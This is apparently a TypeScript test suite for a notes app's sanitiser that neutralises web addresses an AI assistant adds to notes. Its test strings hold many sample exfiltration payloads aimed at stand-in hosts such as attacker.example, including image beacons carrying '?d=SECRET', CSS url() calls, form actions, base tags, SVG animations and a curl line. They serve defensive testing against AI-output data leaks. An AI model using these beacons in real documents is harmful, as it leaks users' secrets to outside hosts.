import { describe, expect, it } from "vitest";
import { defuseNewAddresses, defuseNoteText } from "@plainva/ui";

/**
 * Plan KI-Harness P3-6 / ADR 0019 §6: what the AI writes into a note or a
 * comment carries no address the user's own text did not already carry.
 */
describe("addresses in what the AI writes", () => {
  it("makes inert every address the model brought, wherever it stands", () => {
    const out = defuseNewAddresses("See ![x](https://evil.example/p.png?d=secret) and https://evil.example/a and www.evil.example.", []);
    expect(out.text).toBe("See ![x](https[://]evil.example/p.png?d=secret) and https[://]evil.example/a and www[.]evil.example.");
    expect(out.defused).toBe(3);
  });

  it("keeps an address the user's own text carries, character for character", () => {
    const known = ["Docs: https://known.example/guide (see [the page](https://known.example/guide/setup)).", "Shop at www.known.example today."];
    const text = "Read https://known.example/guide, then [setup](https://known.example/guide/setup). Or www.known.example.";
    expect(defuseNewAddresses(text, known)).toEqual({ text, defused: 0 });
  });

  it("does not let the model hang anything onto a known address or a known host", () => {
    const known = ["Docs: https://known.example/guide"];
    const out = defuseNewAddresses("![](https://known.example/guide?d=secret) https://known.example/other https://known.example/guide/more ![](//known.example/x)", known);
    expect(out.text).toBe("![](https[://]known.example/guide?d=secret) https[://]known.example/other https[://]known.example/guide/more ![]([//]known.example/x)");
    expect(out.defused).toBe(4);
    // A sentence mark may follow a known address; a second one makes it another address.
    expect(defuseNewAddresses("See https://known.example/guide.", known).text).toBe("See https://known.example/guide.");
    expect(defuseNewAddresses("![](https://known.example/guide.b)", known).text).toBe("![](https[://]known.example/guide.b)");
    expect(defuseNewAddresses("![](https://known.example/guide.,)", known).text).toBe("![](https[://]known.example/guide.,)");
  });

  it("keeps a known address that stands inside a foreign one from reviving the foreign one", () => {
    const known = ["https://known.example/a"];
    expect(defuseNewAddresses("https://evil.example/?u=https://known.example/a", known).text).toBe("https[://]evil.example/?u=https://known.example/a");
  });

  it("lints the code of a part of a note, leaves the sure code of a whole note alone, and has no mark a text could forge", () => {
    const fenced = "```\ncurl https://evil.example/x\n```\n";
    // A part placed into a note does not know where it lands: its fence may be none there.
    expect(defuseNewAddresses(fenced, []).text).toBe("```\ncurl https[://]evil.example/x\n```\n");
    // A whole note's fence at the start of its line is code for every renderer.
    expect(defuseNoteText(fenced, [])).toEqual({ text: fenced, defused: 0 });
    // The characters a placeholder once was made of are characters like any other (strand 6, Nr. 12).
    const marks = `${String.fromCharCode(0xe000)}0${String.fromCharCode(0xe001)}`;
    expect(defuseNewAddresses(`${marks} https://evil.example/a`, ["https://known.example/a"]).text).toBe(`${marks} https[://]evil.example/a`);
  });

  it("keeps an address of the user's own only where it stands whole: nothing is hung onto it inside <…> or a value", () => {
    const known = ["See ![](https://known.example/i.png) and <img src=\"https://known.example/h.png\">."];
    for (const text of ["![](<https://known.example/i.png ?d=SECRET>)", '<img src="https://known.example/h.png ?d=SECRET">', '![](https://known.example/i.png"SECRET")']) {
      const out = defuseNewAddresses(text, known);
      expect(out.defused, text).toBeGreaterThan(0);
      expect(out.text, text).not.toMatch(/\(<?https:\/\/known|\ssrc="https:\/\/known/);
    }
    expect(defuseNewAddresses('<img src="https://known.example/h.png"> ![](https://known.example/i.png)', known).defused).toBe(0);
  });

  it("is stable when run again", () => {
    const known = ["https://known.example/a"];
    const once = defuseNewAddresses("https://known.example/a and https://evil.example/b", known);
    expect(defuseNewAddresses(once.text, known)).toEqual({ text: once.text, defused: 0 });
  });
});

/** Strand 6, Nr. 12: a note written whole is linted where the write changed it, and its sure code stays as written. */
describe("a note's text an assistant writes whole", () => {
  const note = [
    "# Notes",
    "",
    "The component renders a list.",
    "",
    "```vue",
    '<template><Link :href="url">Go</Link></template>',
    "```",
    "",
    "```cpp",
    "std::unique_ptr<std::string> name;",
    "```",
    "",
    '<svg width="10"><circle r="4"/></svg> and <std::string>, the user\'s own.',
    "",
    "Last line.",
  ].join("\n");

  it("changes nothing of an edit but what it brings: the user's code and HTML stay byte for byte", () => {
    const next = note.replace("renders a list.", "renders a list. ![](//attacker.example/p.png?d=SECRET)");
    const out = defuseNoteText(next, [note], note);
    expect(out).toEqual({ text: next.replace("](//attacker", "]([//]attacker"), defused: 1 });
  });

  it("reads a woken reference definition whole, to the destination on its next line: half a definition is none", () => {
    // The definition sits alone, its destination on the line below it; a change far away adds the use that wakes it.
    const base = "[r]:\n//attacker.example/p.png?d=SECRET\n\nSome text.\n";
    const next = base.replace("Some text.", "Some text ![x][r]");
    const out = defuseNoteText(next, [base], base);
    expect(out.text).not.toContain("\n//attacker.example");
    expect(out.text).toContain("[//]attacker");
  });

  it("leaves the code of a whole note as written where every renderer shows it as code", () => {
    const html = 'An example:\n\n```html\n<meta charset="utf-8">\n<script src="https://cdn.example/app.js"></script>\n```\n';
    expect(defuseNoteText(html, [])).toEqual({ text: html, defused: 0 });
    // Outside it, the same tag is no example.
    expect(defuseNoteText('<script src="https://cdn.example/app.js"></script>\n', []).text).toContain("&lt;script");
  });

  it("reads a change with what the rest of the note makes of it: a raw HTML block, a tag left open, a style sheet, a form, a base", () => {
    const beacon = "//attacker.example/p.png?d=SECRET";
    const cases: Array<{ base: string; from: string; to: string; inert: (out: string) => boolean }> = [
      // A <pre> block keeps its text raw over blank lines: the value the change completes began above it.
      { base: '<pre>\n<img src="\n\nold">\n</pre>\n', from: "old", to: beacon, inert: (out) => out.startsWith("<pre>\n&lt;img") },
      // A tag left open above a blank line takes the change into it.
      { base: 'Text.\n\n<div>\n<img src="//attacker.example/p.png?d=\n\nold\n\n[x](https://x.example/)\n', from: "old", to: "SECRET", inert: (out) => out.includes("[src]=") },
      // The change is a comment a browser reads as the open tag's attributes.
      { base: "<div>\n<img\n\nold\n", from: "old", to: `<!-- src="${beacon}" -->`, inert: (out) => out.includes("[src]=") },
      // What follows a <style> is a style sheet; a button that follows a <form> sends it; <base> moves every relative address.
      { base: "<style>\n.a { color: red; }\n</pre>\n\nold\n", from: "old", to: `* { background: url(${beacon}) }`, inert: (out) => out.startsWith("&lt;style>") },
      { base: '<form action="https://planted.example/collect">\n\nold\n', from: "old", to: '<input name="d" value="SECRET"><button>Send</button>', inert: (out) => out.startsWith("&lt;form") },
      { base: '<base href="https://planted.example/">\n\nText.\n\nold\n', from: "old", to: "![](p.png?d=SECRET)", inert: (out) => out.startsWith("&lt;base") },
      // Inside the user's <svg>, an animation can set an image's address.
      { base: '<svg width="10">\n<image href="ok.png"/>\n\nold\n\n</svg>\n', from: "old", to: `<set attributeName="href" to="${beacon}"/>`, inert: (out) => out.includes("[to]=") },
      // A <style> inside a paragraph opens a style sheet as well, and a <base> moves the addresses before it too.
      { base: "Text <style>\n.a{}\n\nold\n", from: "old", to: `* { background: url(${beacon}) }`, inert: (out) => out.startsWith("Text &lt;style>") },
      { base: 'Text.\n\nold\n\n<base href="https://planted.example/">\n', from: "old", to: "![](p.png?d=SECRET)", inert: (out) => out.includes("&lt;base") },
    ];
    for (const { base, from, to, inert } of cases) {
      const next = base.replace(from, to);
      const out = defuseNoteText(next, [base], base).text;
      expect(inert(out), out).toBe(true);
      expect(out, out).toContain(to.includes("SECRET") ? "SECRET" : to);
    }
  });

  it("leaves a note alone where a change stays inside code every renderer shows as code", () => {
    // Not even a <style> before it is read: what the change brings is code.
    const base = '<style>.a { color: red; }</style>\n\n<svg width="10"><circle r="4"/></svg>\n\n```sh\ncurl https://ok.example/\n```\n';
    const next = base.replace("ok.example/", "ok.example/ && curl https://other.example/");
    expect(defuseNoteText(next, [base], base)).toEqual({ text: next, defused: 0 });
  });

  it("lints what only might be code: a fence in a list item, behind it, on the item's line, in an HTML block", () => {
    const beacon = "![](//attacker.example/p.png?d=SECRET)";
    for (const lines of [
      ["1. Step", "   ```", "   x", "    ```", `   ${beacon}`],
      ["- a", "  ```", `- ${beacon}`],
      ["- ```", "  x", "  ```", beacon],
      ["- a", "  ```", "  x", "```", beacon, "```"],
      ["<!--", "```", "-->", beacon],
      ["<details>", "```", "</details>", "", beacon],
    ]) {
      const text = lines.join("\n");
      expect(defuseNoteText(text, []).text, text).not.toContain("](//attacker");
    }
  });

  it("defuses a reference definition the user's note already held once a change starts to use it (finding 2026-10-27)", () => {
    const base = "User notes.\n\nSome clipped text.\n\n[ref]: //attacker.example/p.png?d=SECRET\n";
    // The model adds only the use; the definition line is unchanged bytes, yet the beacon must not come alive.
    for (const next of [
      base.replace("User notes.", "Chart: ![c][ref]"),
      base.replace("User notes.", "![ref][]"),
      base.replace("User notes.", "See ![ref] here"),
    ]) {
      const out = defuseNoteText(next, [base], base);
      expect(out.text, next).toContain("[ref]: [//]attacker.example");
      expect(out.defused, next).toBeGreaterThan(0);
    }
    // A dormant definition the change never uses is the user's bytes and stays untouched.
    const elsewhere = defuseNoteText(base.replace("User notes.", "User notes changed."), [base], base);
    expect(elsewhere.text).toBe(base.replace("User notes.", "User notes changed."));
    // A definition the user's own text defines AND uses is a live link of theirs: a rewrite keeps it.
    const own = "See [docs][d].\n\n[d]: https://known.example/g\n";
    expect(defuseNoteText(own.replace("See", "Please see"), [own], own)).toEqual({ text: own.replace("See", "Please see"), defused: 0 });
  });

  it("wakes a dormant reference definition in a list item or with a label across lines (finding 2026-10-27)", () => {
    for (const base of [
      "- [r]: //attacker.example/p.png?d=SECRET\n\nText.\n",
      "* [r]: //attacker.example/p.png?d=SECRET\n\nText.\n",
      "1. [r]: //attacker.example/p.png?d=SECRET\n\nText.\n",
      "[a\nb]: //attacker.example/p.png?d=SECRET\n\nText.\n",
    ]) {
      const next = base.replace("Text.", base.includes("[a\nb]") ? "Text ![x][a b]" : "Text ![x][r]");
      const out = defuseNoteText(next, [base], base);
      expect(out.text, base).toContain("[//]attacker");
      expect(out.text, base).not.toContain(" //attacker");
      expect(out.defused, base).toBeGreaterThan(0);
    }
  });

  it("defuses a www. address even where it follows a letter, which some renderers link though micromark does not", () => {
    expect(defuseNewAddresses("Visit xwww.attacker.example/?d=SECRET now.", []).text).toContain("www[.]attacker.example");
    expect(defuseNewAddresses("Our site www.known.example/a is fine.", ["www.known.example/a"]).text).toContain("www.known.example/a");
  });
});
